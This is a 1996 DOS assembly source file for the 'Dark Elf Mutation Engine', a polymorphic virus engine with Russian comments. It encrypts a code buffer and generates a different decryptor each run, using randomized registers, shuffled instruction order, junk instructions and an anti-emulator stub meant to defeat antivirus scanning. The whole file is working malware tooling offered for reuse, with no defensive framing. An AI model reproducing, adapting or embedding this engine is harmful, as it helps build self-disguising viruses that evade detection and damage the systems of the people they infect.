;  ┌────────────────────────────────────────────────────────────────────┐
;  │  Dark Elf Mutation Engine [DEME] v1.1 CopyLeft (cl) MSTUdent 1996	│
;  └────────────────────────────────────────────────────────────────────┘
;
;подпрограммы :
; DEME	    - сам Mutation и есть
; Randomize - юзает порт 40h
; RND	    - AX = RND(65536)

PUSHSTATE
IDEAL
LOCALS	@@
DEME_MaxDecoderLen=1500
proc	DEME
;Параметры :
;es:di - адрес буфера, в который будет записан результат
;		размер_буфера = размер_исходного_кода + 1500
;ds:si - адрес кода, который необходимо зашифровать
;dx    - адрес привязки расшифровщика (подобно ORG xxxx)
;bx    - размер исходного кода (в байтах)
;Возвращает :
;cx    - длина полученного кода (в байтах)
		pushf
		push	bx di si ds
		push	cs
		pop	ds
		cld
		inc	bx
		shr	bx,1
		mov	[DEME_CodeLen],bx
		mov	[DEME_Origin],dx
		mov	[DEME_BuffOffs],di
		call	Randomize
		call	DEME_ChooseRegs
		call	DEME_GenProlog
		call	DEME_GenCrypt
		call	DEME_GenEpilog
		pop	ds si
		call	DEME_Encode
		mov	cx,di
		pop	di bx
		sub	cx,di
		popf
		ret
endp	DEME

R_AX=00000000b
R_CX=00000001b
R_DX=00000010b
R_BX=00000011b
R_SP=00000100b
R_BP=00000101b
R_SI=00000110b
R_DI=00000111b

M_AX=00000001b
M_CX=00000010b
M_DX=00000100b
M_BX=00001000b
M_SP=00010000b
M_BP=00100000b
M_SI=01000000b
M_DI=10000000b
M_INDEX=M_BX+M_SI+M_DI
M_ALL=M_AX+M_CX+M_DX+M_BX+M_BP+M_SI+M_DI

DEME_ID 	db	'[DEME] Dark Elf Mutation Engine v1.1',0
DEME_CopyLeft	db	'CopyLeft (cl) MSTUdent',0
DEME_Date	db	??date,0,??time,0

proc	DEME_Encode	near
		push	ax bx cx dx si
		mov	cx,[DEME_CodeLen]
		mov	dx,[DEME_Key]
@@1:
		lodsw
		xor	ax,dx
		stosw
		add dx,[DEME_KeyAdd]
		loop @@1
		pop	si dx cx bx ax
		ret
endp	DEME_Encode

proc	DEME_ChooseRegs 	near
		push	ax
		mov	[DEME_MaskUsed],M_SP
		mov	al,M_INDEX
		call	DEME_GetAnyReg
		mov	[DEME_RegIndex],ax
		mov	al,M_ALL
		call	DEME_GetAnyReg
		mov	[DEME_RegCounter],ax
		mov	al,M_ALL
		call	DEME_GetAnyReg
		mov	[DEME_RegKey],ax
		pop	ax
		ret
endp	DEME_ChooseRegs


proc	DEME_GenProlog	near
		push	ax bx cx dx
		call	DEME_GenRandomSeq
		call	DEME_GenAntiWeb

		mov	bx,offset DEME_GenLoadIndex
		mov	cx,offset DEME_GenLoadKey
		mov	dx,offset DEME_GenLoadCounter

		call	DEME_MixRegs
		call	DEME_GenRandomSeq
		call	bx
		call	DEME_GenRandomSeq
		call	dx
		call	DEME_GenRandomSeq
		call	cx
		call	DEME_GenRandomSeq

		pop	dx cx bx ax
		ret
endp	DEME_GenProlog


proc	DEME_GenAntiWeb
		push	ax bx cx
		mov	cl,[DEME_MaskUsed]
		test	cl,M_AX
		je	@@1
		mov	al,050h
		stosb
		call	DEME_GenRandomSeq
@@1:
		or	[DEME_MaskUsed],M_AX
		mov	ax,41e4h
		stosw
		call	DEME_GenRandomSeq
		mov	ax,1100010010001000b
		stosw
		call	DEME_GenRandomSeq
		mov	ax,41e4h
		stosw
		call	DEME_GenRandomSeq
		mov	ax,1100010000110000b
		stosw
		mov	al,01110101b
		stosw
		mov	bx,di
		call	DEME_GenRandomSeq
		mov	ax,4cb4h
		stosw
		mov	ax,21cdh
		stosw
		call	DEME_GenRandomSeq
		mov	ax,di
		sub	ax,bx
		mov	[es:bx-1],al

		test	cl,M_AX
		je	@@2
		mov	al,058h
		stosb
		call	DEME_GenRandomSeq
@@2:
		mov	[DEME_MaskUsed],cl
		pop	cx bx ax
		ret
endp	DEME_GenAntiWeb


proc	DEME_GenLoadIndex	near
		push	ax
		mov	ax,[DEME_RegIndex]
		or	al,10111000b
		stosb
		mov	[DEME_AddrBeg],di
		stosw
		pop	ax
		ret
endp	DEME_GenLoadIndex

proc	DEME_GenLoadKey 	near
		push	ax bx
		call	RND
		mov	bx,ax
		mov	[DEME_Key],ax
		mov	ax,[DEME_RegKey]
		call	DEME_GenLoadReg16
		pop	bx ax
		ret
endp	DEME_GenLoadKey

proc	DEME_GenLoadCounter	near
		push	ax bx
		mov	ax,[DEME_RegCounter]
		mov	bx,[DEME_CodeLen]
		call	DEME_GenLoadReg16
		pop	bx ax
		ret
endp	DEME_GenLoadCounter

proc	DEME_GenCrypt	near
		push	ax bx cx dx
		mov	[DEME_LoopAddr],di

		call	DEME_GenRandomSeq
		call	DEME_GenXorCmd

		mov	dx,offset DEME_GenIncIndex
		mov	bx,offset DEME_GenAddKey
		mov	cx,offset DEME_GenDecCounter
		call	DEME_MixRegs
		call	DEME_GenRandomSeq
		call	bx
		call	DEME_GenRandomSeq
		call	dx
		call	DEME_GenRandomSeq
		call	cx
		call	DEME_GenRandomSeq
		call	DEME_GenCloseCycle
		call	DEME_GenRandomSeq
		pop	dx cx bx ax
		ret
endp	DEME_GenCrypt

proc	DEME_GenXorCmd	near
		push	ax bx
		mov	al,2eh
		stosb
		mov	al,00110001b
		stosb
		mov	bx,[DEME_RegIndex]
		cmp	bx,R_BX
		jne	@@1
		mov	al,00000111b
@@1:
		cmp	bx,R_SI
		jne	@@2
		mov	al,00000100b
@@2:
		cmp	bx,R_DI
		jne	@@3
		mov	al,00000101b
@@3:
		mov	bx,[DEME_RegKey]
		shl	bl,3
		or	al,bl
		stosb
		pop	bx ax
		ret
endp	DEME_GenXorCmd

proc	DEME_GenIncIndex	near
		push	ax bx
		mov	bx,[DEME_RegIndex]
		call	RND
		and	ax,3
		or	al,al
		jne	@@1
		mov	al,01000000b
		or	al,bl
		stosb
		stosb
		jmp	@@Exit
@@1:
		dec	al
		jne	@@2
		mov	al,10000001b
		stosb
		mov	al,11000000b
		or	al,bl
		stosb
		mov   ax,2
		stosw
		jmp	@@Exit
@@2:
		dec	al
		jne	@@3
		mov	al,10000001b
		stosb
		mov	al,11101000b
		or	al,bl
		stosb
		mov   ax,-2
		stosw
		jmp	@@Exit
@@3:
		call	DEME_GetUnusedReg
		mov	bx,2
		call	DEME_GenLoadReg16
		mov	bx,[DEME_RegIndex]
		mov	bh,al
		shl	bh,3
		mov	al,00000001b
		stosb
		mov	al,11000000b
		or	al,bl
		or	al,bh
		stosb
@@Exit:
		pop	bx ax
		ret
endp	DEME_GenIncIndex

proc	DEME_GenAddKey	near
		push	ax bx
		mov	bx,[DEME_RegKey]
		call	RND
		mov	[DEME_KeyAdd],ax
		push	ax
		call	RND
		xor	ah,ah
		test	al,00000100b
		je	@@1
		neg	[DEME_KeyAdd]
		mov	ah,00101000b
@@1:
		mov	al,10000001b
		stosb
		mov	al,11000000b
		xor	al,ah
		or	al,bl
		stosb
		pop	ax
		stosw
@@Exit:
		pop	bx ax
		ret
endp	DEME_GenAddKey

proc	DEME_GenDecCounter	near
		push	ax bx
		mov	bx,[DEME_RegCounter]
		call	RND
		and	ax,3
		or	al,al
		jne	@@1
		mov	al,01001000b
		or	al,bl
		stosb
		jmp	@@Exit
@@1:
		dec	al
		jne	@@2
		mov	al,10000001b
		stosb
		mov	al,11000000b
		or	al,bl
		stosb
		mov   ax,-1
		stosw
		jmp	@@Exit
@@2:
		dec	al
		jne	@@3
		mov	al,10000001b
		stosb
		mov	al,11101000b
		or	al,bl
		stosb
		mov   ax,1
		stosw
		jmp	@@Exit
@@3:
		call	DEME_GetUnusedReg
		mov	bx,1
		call	DEME_GenLoadReg16
		mov	bx,[DEME_RegCounter]
		mov	bh,al
		shl	bh,3
		mov	al,00101001b
		stosb
		mov	al,11000000b
		or	al,bl
		or	al,bh
		stosb
@@Exit:
		pop	bx ax
		ret
endp	DEME_GenDecCounter

proc	DEME_GenCloseCycle	near
		push	ax bx cx dx
		call	RND
		and	ax,3
		shl	ax,1
		mov	bx,ax
		call	[DEME_Clos1Tbl+bx]
		call	RND
		test	al,1
		je	@@1
		mov	al,10011100b
		stosb
		call	DEME_GenRandomSeq
		mov	al,10011101b
		stosb
@@1:
		call	[DEME_Clos2Tbl+bx]
		call	DEME_GenRandomSeq
		call	DEME_ClosJmp
		call	DEME_GenRandomSeq
		call	DEME_ClosJmpShort
		call	DEME_GenRandomSeq
		pop	dx cx bx ax
		ret
endp	DEME_GenCloseCycle

DEME_Clos1Tbl	dw	offset DEME_Clos11
		dw	offset DEME_Clos12
		dw	offset DEME_Clos13
		dw	offset DEME_Clos14

DEME_Clos2Tbl	dw	offset DEME_Clos21
		dw	offset DEME_Clos22
		dw	offset DEME_Clos21
		dw	offset DEME_Clos21

proc	DEME_Clos11	near
		push	ax bx
		mov	al,10000001b
		stosb
		mov	ax,[DEME_RegCounter]
		or	al,11111000b
		stosb
		xor	ax,ax
		stosw
		pop	bx ax
		ret
endp	DEME_Clos11

proc	DEME_Clos12	near
		push	ax bx
		mov	al,10000001b
		stosb
		mov	ax,[DEME_RegCounter]
		or	al,11111000b
		stosb
		xor	ax,ax
		inc	ax
		stosw
		pop	bx ax
		ret
endp	DEME_Clos12

proc	DEME_Clos13	near
		push	ax bx
		mov	al,00001001b
		stosb
		mov	ax,[DEME_RegCounter]
		mov	ah,11000000b
		or	ah,al
		shl	al,3
		or	al,ah
		stosb
		pop	bx ax
		ret
endp	DEME_Clos13

proc	DEME_Clos14	near
		push	ax bx
		mov	al,11110111b
		stosb
		mov	ax,[DEME_RegCounter]
		or	al,11000000b
		stosb
		xor	ax,ax
		dec	ax
		stosw
		pop	bx ax
		ret
endp	DEME_Clos14

proc	DEME_Clos21	near
		push	ax
		mov	al,01110100b
		stosb
		mov	[DEME_JmpShort],di
		stosb
		pop	ax
		ret
endp	DEME_Clos21

proc	DEME_Clos22	near
		push	ax
		mov	al,01110010b
		stosb
		mov	[DEME_JmpShort],di
		stosb
		pop	ax
		ret
endp	DEME_Clos22

proc	DEME_ClosJmp	near
		push	ax
		mov	al,11101001b
		stosb
		mov	ax,[DEME_LoopAddr]
		sub	ax,di
		dec	ax
		dec	ax
		stosw
		pop	ax
		ret
endp	DEME_ClosJmp

proc	DEME_ClosJmpShort	near
		push	ax bx
		mov	ax,di
		mov	bx,[DEME_JmpShort]
		sub	ax,bx
		dec	ax
		mov	[es:bx],al
		pop	bx ax
		ret
endp	DEME_ClosJmpShort

proc	DEME_GenEpilog	near
		push	ax bx dx
		call	RND
		and	ax,3fh
		inc	ax
@@1:
		call	DEME_GenTrash
		dec	ax
		jnz	@@1
		mov	bx,[DEME_AddrBeg]
		mov	dx,di
		sub	dx,[DEME_BuffOffs]
		add	dx,[DEME_Origin]
		mov	[es:bx],dx
		pop	dx bx ax
		ret
endp	DEME_GenEpilog


proc	DEME_MixRegs	near
		push	ax
		call	RND
		test	al,1
		je	@@1
		xchg	bx,cx
@@1:
		test	al,2
		je	@@2
		xchg	cx,dx
@@2:
		test	al,4
		je	@@3
		xchg	bx,dx
@@3:
		pop	ax
		ret
endp	DEME_MixRegs


proc	Randomize	near
		push	ax
		in	ax,40h
		mov	[seed1],ax
		pop	ax
		ret
endp	Randomize

proc	RND	near
		push	dx
		mov	ax,[seed]
		xor	ax,[seed1]
		mul	ax
		mov	al,dl
		mov	[seed],ax
		pop	dx
		ret
endp	RND


;Генерация команд

proc	DEME_GenRandomSeq	near
;Генерит кучу мусора
		push	ax
		call	RND
		and	ax,0fh
		inc	ax
@@1:
		call	DEME_GenTrash
		dec	ax
		jnz	@@1
		pop	ax
		ret
endp	DEME_GenRandomSeq

proc	DEME_GenTrash	near
;Генерит 'мусорную' команду
		push	ax bx
		call	RND
		and	ax,3
		shl	ax,1
		mov	bx,ax
		call	[DEME_TrashTbl+bx]
		pop	bx ax
		ret
endp	DEME_GenTrash

DEME_TrashTbl	dw	offset DEME_GenCmd1
		dw	offset DEME_GenCmd2
		dw	offset DEME_GenCmd3
		dw	offset DEME_GenCmd4

proc	DEME_GenCmd1	near
;Генерит 1-байтовую левейшую команду извращающую AX
ret
		push	ax bx
		test	[DEME_MaskUsed],M_AX
		jne	@@Exit
		call	RND
		and	ax,7
		mov	bx,ax
		mov	al,[DEME_Cmds1+bx]
		stosb
@@Exit:
		pop	bx ax
		ret
endp	DEME_GenCmd1

DEME_Cmds1	db	00110111b	;aaa
		db	00111111b	;aas
		db	10011000b	;cbw
		db	00100111b	;daa
		db	00101111b	;das
		db	01001000b	;dec ax
		db	01000000b	;inc ax
		db	10011111b	;lahf


proc	DEME_GenCmd2	near
;Генерит 1-операндную команду
		push	ax bx
		call	RND
		and	ax,0fh
		mov	bx,ax
		shl	bx,1
		mov	al,[DEME_Cmds2+bx]
		stosb
		mov	bl,[DEME_Cmds2+bx+1]
		call	DEME_GetUnusedReg
		or	al,bl
		stosb
		pop	bx ax
		ret
endp	DEME_GenCmd2

DEME_Cmds2	db	0d1h,11000000b	;rol
		db	0d1h,11001000b	;ror
		db	0d1h,11010000b	;rcl
		db	0d1h,11011000b	;rcr
		db	0d1h,11100000b	;shl
		db	0d1h,11101000b	;shr
		db	0ffh,11000000b	;inc
		db	0ffh,11001000b	;dec
		db	0f7h,11010000b	;not
		db	0f7h,11011000b	;neg
		db	0d3h,11000000b	;rol cl
		db	0d3h,11001000b	;ror cl
		db	0d3h,11010000b	;rcl cl
		db	0d3h,11011000b	;rcr cl
		db	0d3h,11100000b	;shl cl
		db	0d3h,11101000b	;shr cl

proc	DEME_GenCmd3	near
;Генерит 2-х операндную команду с непосредственным значением
		push	ax bx
		mov	al,[DEME_MaskUsed]
		push	ax
		or	[DEME_MaskUsed],M_AX	;Для AX коды команд другие
		call	RND
		xor	ah,ah
		mov	bl,9
		div	bl
		mov	bl,ah
		xor	bh,bh
		shl	bx,1
		mov	al,[DEME_Cmds3+bx]
		stosb
		mov	bl,[DEME_Cmds3+bx+1]
		call	DEME_GetUnusedReg
		or	al,bl
		stosb
		call	RND
		stosw
		pop	ax
		mov	[DEME_MaskUsed],al
		pop	bx ax
		ret
endp	DEME_GenCmd3

DEME_Cmds3	db	081h,11000000b	 ;add
		db	081h,11010000b	 ;adc
		db	081h,11101000b	 ;sub
		db	081h,11110000b	 ;xor
		db	0f7h,11000000b	 ;test
		db	081h,11011000b	 ;sbb
		db	081h,11001000b	 ;or
		db	081h,11111000b	 ;cmp
		db	081h,11100000b	 ;and
;		 db	 0c7h,11000000b   ;mov


proc	DEME_GenCmd4	near
;Генерит 2-х операндную команду
		push	ax bx cx dx

		call	RND
		xor	ah,ah
		mov	bl,10
		div	bl
		mov	bl,ah
		xor	bh,bh
		mov	al,[DEME_Cmds4+bx]
		stosb

		call	DEME_GetUnusedReg
		shl	al,3
		mov	dl,al
		call	RND
		and	al,00000111b
		or	al,11000000b
		or	al,dl
		stosb

		pop	dx cx bx ax
		ret
endp	DEME_GenCmd4

DEME_Cmds4	db	003h	;add
		db	013h	;adc
		db	02bh	;sub
		db	033h	;xor
		db	085h	;test
		db	01bh	;sbb
		db	00bh	;or
		db	03bh	;cmp
		db	023h	;and
		db	08bh	;mov


proc	DEME_GetUnusedReg	near
;Возвращает неиспользуемый регистр (для мусора)
		push	bx
		mov	bl,[DEME_MaskUsed]
		mov	al,M_ALL
		call	DEME_GetAnyReg
		mov	[DEME_MaskUsed],bl
		pop	bx
		ret
endp	DEME_GetUnusedReg


proc	DEME_GetAnyReg	near
;Возвращает неиспользуемый регистр из определенной группы
		push	bx cx
		mov	bl,al
		not	bl
		or	bl,[DEME_MaskUsed]

		call	RND
		and	ax,7
		mov	cl,al
		mov	ah,1
		rol	ah,cl
@@11:
		test	ah,bl
		je	@@12
		inc	al
		and	al,7
		rol	ah,1
		jmp	@@11
@@12:
		or	[DEME_MaskUsed],ah
		and	ax,7
		pop	cx bx
		ret
endp	DEME_GetAnyReg


proc	DEME_GenLoadReg16	near
;Генерит загрузку регистра
;ax - какого
;bx - чем
		push	ax bx
		and	al,00000111b
		or	al,10111000b
		stosb
		mov   ax,bx
		stosw
		pop	bx ax
		ret
endp	DEME_GenLoadReg16

Seed		dw	0
Seed1		dw	0
DEME_MaskUsed	db	0

DEME_RegIndex	dw	0
DEME_RegCounter dw	0
DEME_RegKey	dw	0

DEME_Origin	dw	0
DEME_BuffOffs	dw	0

DEME_LoopAddr	dw	0
DEME_JmpShort	dw	0
DEME_CodeLen	dw	0
DEME_Key	dw	0
DEME_KeyAdd	dw	0
DEME_AddrBeg	dw	0

POPSTATE




